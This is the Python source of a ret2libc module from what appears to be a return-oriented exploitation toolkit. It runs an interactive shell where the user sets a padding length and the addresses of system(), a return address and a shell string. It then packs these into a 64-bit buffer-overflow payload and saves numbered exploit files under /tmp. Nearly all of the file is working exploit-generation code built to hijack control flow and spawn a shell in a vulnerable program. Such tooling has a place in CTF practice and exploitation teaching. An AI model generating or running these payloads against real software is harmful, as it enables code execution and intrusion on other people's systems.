# -*- coding: utf-8 -*-
"""

ret2libc_module.py : Module

Version: 1.0.0
Author: wil.tor	
License: https://opensource.org/licenses/GPL-3.0

"""

from core import *
from struct import pack

def rettolibc_module_write(padding, system_addr, shell_addr, ret_addr, inc):
	if padding == "": 
		print(F_M+" Set 'padding' for write your exploit.")
	else:
		payload = 'a'*int(str(padding))
		payload += pack('<Q', int(str(system_addr), 16))
		payload += pack('<Q', int(str(ret_addr), 16))
		payload += pack('<Q', int(str(shell_addr), 16))

		if os.path.exists(EXPLOIT_FILE+str(inc)+".rkit"):
			while(os.path.exists(EXPLOIT_FILE+str(inc)+".rkit") == True):
				inc+=1
			exploit_file = open(EXPLOIT_FILE+str(inc)+".rkit", "a+")
			exploit_file.write(payload)

		elif os.path.exists(EXPLOIT_DIRECTORY):
			exploit_file = open(EXPLOIT_FILE+str(inc)+".rkit", "a+")
			exploit_file.write(payload)
		else:
			os.makedirs(EXPLOIT_DIRECTORY)
			exploit_file = open(EXPLOIT_FILE+str(inc)+".rkit", "a+")
			exploit_file.write(payload)

		print(R_M+" Exploit is loaded at '%s"%EXPLOIT_FILE+str(inc)+".rkit'")

def rettolibc_reset_exploit_file(inc, dltall): 
	if dltall == False:
		if os.path.exists(EXPLOIT_FILE+str(inc)+".rkit") is not True:
			print(F_M+" 'exploit-%s' doesn't exist."%inc)
		else:
			os.remove(EXPLOIT_FILE+str(inc)+".rkit")
			print(R_M+" reset: '%s"%EXPLOIT_FILE+str(inc)+".rkit'")
	else:
		todlt=os.listdir(EXPLOIT_DIRECTORY)

		if not(todlt):
			print(F_M+" There is no exploit to reset.")
		for i in range(0,len(todlt)):
				os.remove(EXPLOIT_DIRECTORY+'/'+todlt[i])
		for files in todlt: 
			print(R_M+" reset: '%s'"%files)

def rettolibc_show_exploit(inc):
	list_exploit=os.listdir(EXPLOIT_DIRECTORY)

	if not(list_exploit):
		print(F_M+" There is no exploit(s).")
	else:
		print(R_M+" exploits list: \n")
		i=0
		while(i<len(list_exploit)): 
			i+=1
		if any(str("exploit-"+str(i)+".rkit") in s for s in list_exploit):
			print(R_M+" Written: \n")
			for k in range(0, len(list_exploit)):
				print(RF_M+" '"+str(list_exploit[k])+"'")
			print("\n"+R_M+" Currently: \n")
			print(RR_M+" 'exploit-"+str(int(i+1))+".rkit'\n")
		else:
			print(str(EXPLOIT_FILE+str(int(i+1))+".rkit"))
			print(list_exploit)



def rettolibc_module():
	# Availables variables ###
	inc = 0
	padding = 0

	shell_address = 0x0
	system_address = 0x0
	return_address = 0x0
	### END: Availables variables #

	### Tmp variables ### 
	p=0
	sh_a=0
	sys_a=0
	ret_a=0
	### END: Tmp variables #

	while True:
		try:
			command = raw_input(SHELL+"(ret2libc) "+RB+">> "+W)
			tokenized = command.split(" ")

			if tokenized[0] == "exit":
				break
			elif tokenized[0] == "clear" or tokenized[0] == "cls":
				os.system("clear")
				continue
			elif tokenized[0] == "help": 
				help_struct()
				continue
			elif tokenized[0] == "reset":
				if tokenized[1] != "": 
					if tokenized[1] == "all" or tokenized[1] == "*":
						rettolibc_reset_exploit_file(inc, True)
						continue 
					else:
						rettolibc_reset_exploit_file(tokenized[1], False)
						continue
					continue
				else:
					print(F_M+" Specify the associated number to exploit to delete it.")
					continue
				continue
			elif tokenized[0] == "sh" or tokenized[0] == "bash" or tokenized[0] == "fish": 
				print(R_M+" open shell: '%s'."%tokenized[0])
				system(tokenized[0])
				continue
			elif tokenized[0] == "show": 
				if tokenized[1] == "commands": 
					print(W+"\n[Commands]")
					print("----------\n")
					print(W+"\n(Core):")
					print("-------\n") 
					sys.stdout.write(G+"	[ write ]"+W)
					sys.stdout.write("	Write your exploit in '/tmp/ropkit-session-exploit-directory/'\n")
					sys.stdout.write(G+"	[ reset ]"+W)
					sys.stdout.write("	Reset your exploit in '/tmp/ropkit-session-exploit-directory/'\n")
					print(W+"\n(Informations):")
					print("---------------\n")
					sys.stdout.write(G+"	[ show exploit ]"+W)
					sys.stdout.write("		Show exploit(s) informations\n")
					sys.stdout.write(G+"	[ show set-variables ]"+W)
					sys.stdout.write("		Show availables variables to set\n")
					sys.stdout.write(G+"	[ show advanced-set-variables ]"+W)
					sys.stdout.write("	Show availables advanced variables to set\n\n")
					continue
				elif tokenized[1] == "modules": 
					print(F_M+" For look others modules, quit with 'quit'.")
					continue
				elif tokenized[1] == "exploit": 
					rettolibc_show_exploit(inc) 
					continue
				elif tokenized[1] == "set-variables" or tokenized[1] == "s-v":
					print(R_M+" Availables variables: padding")
					continue
				elif tokenized[1] == "advanced-set-variables" or tokenized[1] == "a-s-v": 
					print(R_M+" Availables advanced variables: padding; SystemAddress; ReturnAddress; ShellAddress")
					continue
				else: 
					print(F_M+" Unknown option: "+tokenized[1]+".")
					continue
			elif tokenized[0] == "set": 
				if tokenized[1] == "padding": 
					if not tokenized[2] is None and tokenized[2] != "":
						if int(str(tokenized[2])) > 5000:
							print(F_M+" Give me a value included in [0;5000]")
							continue
						else:
							print(R_M+" set: "+tokenized[1]+ " ==> "+tokenized[2])
							padding = int(str(tokenized[2])); p+=padding; continue
						continue
					else: 
						print(F_M+" Assign a value to variable: "+tokenized[1]+".")
						continue 
				elif tokenized[1] == "SystemAddress" or tokenized[1] == "ReturnAddress" or tokenized[1] == "ShellAddress":
					if not tokenized[2] is None: 
						if len(str(tokenized[2])) > 18: 
							print(F_M+" Give me an address between 0 and 16 characters")
							continue
						else: 
							print(R_M+" set: "+tokenized[1]+" ==> "+tokenized[2])

							if tokenized[1] == "SystemAddress": 
								system_address = str(tokenized[2])
								sys_a+=int(str(system_address), 16); continue 
							elif tokenized[1] == "ReturnAddress": 
								return_address = str(tokenized[2])
								ret_a+=int(str(return_address), 16); continue
							elif tokenized[1] == "ShellAddress": 
								shell_address = str(tokenized[2])
								sh_a+=int(str(shell_address), 16); continue 
							continue
					else:
						print(F_M+" Assign a value to advanced variable: "+tokenized[1]+".")
						continue
				else: 
					print(F_M+" Unknown variable: "+tokenized[1]+".")
					continue
			elif tokenized[0] == "write": 
				inc+=1
				rettolibc_module_write(padding, system_address, shell_address, return_address, inc)
			else: 
				print(WARN+tokenized[0]+".")
				continue

		except (KeyboardInterrupt, EOFError): 
			print WARN_INT_MODULE
		except IndexError: 
			print(F_M+" Specify an option or a value for command: "+tokenized[0]+".")
			continue